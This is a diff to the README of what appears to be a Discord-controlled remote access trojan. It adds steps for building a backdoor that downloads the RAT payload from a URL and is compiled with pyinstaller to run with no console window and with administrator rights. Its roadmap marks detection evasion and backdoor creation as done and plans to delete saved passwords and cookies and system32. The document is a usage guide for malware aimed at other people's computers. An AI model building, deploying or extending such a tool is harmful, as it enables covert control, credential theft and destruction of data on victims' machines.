@@ -115,13 +115,36 @@ rat.token_set("DISCORD_TOKEN_HERE")
 
 3. Enter your Discord Server ID & Webhook URL in `rat.py`
 ```python
-webhook = 'DISCORD_WEBHOOK_URL'
+api = 'DISCORD_WEBHOOK_URL'
 server_id = "DISCORD_SERVER_ID"
 ```
 
 4. Run `create_payload.py`
 
 5. Wait for the payload to be created
+
+
+### Optional ###
+
+Below is how to create a simple backdoor for the rat
+
+1. Download or clone the repository
+
+2. Enter your Discord Webhook URL in `backdoor.py`
+```python
+api = 'DISCORD_WEBHOOK_URL'
+```
+
+3. Replace "DOWNLOAD_URL_HERE" with the download URL of the payload
+```python
+r = requests.get("DOWNLOAD_URL_HERE", allow_redirects=False)
+```
+
+4. Cd to the directory of the `backdoor.py`
+
+5. Run `pyinstaller --onefile --noconsole --uac-admin --clean --log-level=INFO backdoor.py`
+
+6. After the program is compiled, you can find the created executable in the directory `dist`
 
 > Any problems? Create an issue!
 
@@ -130,7 +153,8 @@ server_id = "DISCORD_SERVER_ID"
 
 - [x] Fix builder
 - [x] Clean builder GUI
-- [ ] Remote import all commands for less detections
+- [x] Remote import all commands for less detections
+- [x] Create backdoor
 - [ ] Be able to customize payload when creating it
 - [ ] Add delete all saved passwords & cookies
 - [ ] Add break PC (delete system32)
